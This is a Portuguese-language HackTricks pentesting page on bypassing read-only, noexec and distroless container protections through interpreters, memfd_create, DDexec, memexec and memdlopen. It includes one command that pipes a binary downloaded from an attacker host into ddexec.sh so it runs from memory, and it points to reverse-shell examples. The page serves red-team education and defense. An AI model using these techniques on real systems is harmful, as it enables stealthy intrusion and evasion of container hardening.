# Bypass de proteções do FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Vídeos

Nos vídeos a seguir, você encontrará as técnicas mencionadas nesta página explicadas com mais detalhes:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## cenário read-only / no-exec

Em um container, você pode montar o root filesystem como read-only definindo **`readOnlyRootFilesystem: true`** no security context.<sup>[[3]](#references)</sup> Por exemplo:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Um root read-only não torna os volumes montados separadamente read-only. O Docker trata **`/dev/shm`** como uma montagem IPC, enquanto opções de tmpfs como `rw` e `noexec` são escolhas de configuração em runtime; inspecione as opções de montagem do container-alvo antes de depender de qualquer um desses comportamentos.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> De uma perspectiva de red team, essa combinação pode dificultar o download e a execução de binaries que ainda não estejam disponíveis (por exemplo, backdoors ou enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass mais fácil: Scripts

Uma montagem `noexec` bloqueia a execução direta de binaries nessa montagem, mas um interpreter ainda pode ler e interpretar um script. Portanto, se `sh` ou `python` estiver presente, você poderá executar um shell ou um script Python por meio desse interpreter.<sup>[[5]](#references)</sup>

Isso não ajuda quando a ferramenta necessária é, por si só, um binary.<sup>[[5]](#references)</sup>

## Bypasses de memória

Quando a execução direta a partir de um path montado é bloqueada, uma opção é carregar o ELF na memória e executá-lo por meio de um path em memória. Isso evita a verificação `noexec` nessa montagem, mas não remove outros controles do kernel, de permissões ou de policy.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass de FD + syscall exec

Se um scripting runtime puder acessar a interface Linux relevante, ele poderá criar um file descriptor anônimo, baseado em RAM, com **`memfd_create(2)`**, gravar os bytes do ELF nele e usar um caminho de execução baseado em fd. O projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gera código Python, Perl ou Ruby comprimido e codificado em base64 para esse workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Atualmente, o projeto documenta targets Python, Perl e Ruby; PHP ou Node precisam de uma técnica ou extensão específica para o runtime, portanto a ausência desse generator para uma linguagem não significa que a execução em memória seja impossível.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Um executable regular gravado em **`/dev/shm`** continua sujeito à configuração **`noexec`** dessa montagem; apenas abri-lo por meio de um file descriptor comum não altera a policy da montagem.<sup>[[5]](#references)</sup>
>
> O método exato de execução em memória também depende do runtime, da arquitetura, do kernel e das permissões disponíveis.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) grava um stager e um loader no processo shell em execução por meio de **`/proc/self/mem`** e, em seguida, transfere o controle para esse código.<sup>[[8]](#references)</sup>

Isso permite que o processo carregue um binary fornecido sem primeiro colocar esse binary em um filesystem executável.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** pode carregar e **executar** shellcode ou um binary a partir da **memória**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para mais informações sobre esta técnica, consulte o Github ou:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é uma implementação daemonized do DDexec. Seu daemon escuta solicitações contendo argumentos e bytes brutos do programa, faz fork de um processo filho para carregar e executar cada programa e mantém o processo pai como servidor.<sup>[[9]](#references)</sup>

O repositório inclui um exemplo de uso do **memexec para executar binários a partir de um PHP reverse shell** em [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Com uma finalidade semelhante à do DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) é uma implementação fileless de `dlopen()` para um shared object ou programa. O README atualmente documenta suporte a ARM64, portanto verifique a arquitetura do alvo antes de usá-lo.<sup>[[10]](#references)</sup>

## Bypass de Distroless

Para uma explicação dedicada sobre **o que distroless realmente é**, quando ele ajuda, quando não ajuda e como ele altera as estratégias de post-exploitation em containers, consulte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### O que é distroless

Imagens distroless contêm apenas a aplicação e suas dependências de runtime; as imagens oficiais omitem gerenciadores de pacotes, shells e outros programas esperados em uma distribuição Linux padrão.<sup>[[11]](#references)</sup>

Manter a imagem de runtime limitada a essas dependências reduz o software presente em produção e a quantidade que precisa ser escaneada e monitorada.<sup>[[11]](#references)</sup>

### Reverse Shell

Em um container distroless, você pode **não encontrar `sh` ou `bash`** para um shell regular, nem utilitários comuns como `ls`, `whoami` ou `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Portanto, um reverse shell comum baseado em shell ou uma enumeração baseada em utilitários pode não funcionar.<sup>[[11]](#references)</sup>

Se a aplicação comprometida incluir um runtime de linguagem (por exemplo, Python para uma aplicação Flask ou Node.js para uma aplicação Node), um RCE ainda poderá usar esse runtime para um command channel e inspeção do sistema por meio de suas APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Use a linguagem de scripting disponível para **enumerar o sistema** por meio dos recursos dessa linguagem.<sup>[[12]](#references)</sup>

Se não houver proteções **read-only/no-exec**, um command channel poderá gravar binários em um mount gravável e executável e executá-los; verifique primeiro as opções do mount e as permissões.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Quando essas proteções estiverem presentes, use as **técnicas de execução em memória acima**, onde o runtime, o kernel e as permissões permitirem.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Você pode encontrar **exemplos** de exploração de vulnerabilidades de RCE para obter **reverse shells** em linguagens de scripting e executar binários a partir da memória em [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Explorando a manipulação de memória do Linux para furtividade e evasão](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusões furtivas com DDexec-ng e dlopen() em memória - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurar um Security Context para um Pod ou Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - página do manual do Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - página do manual do Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
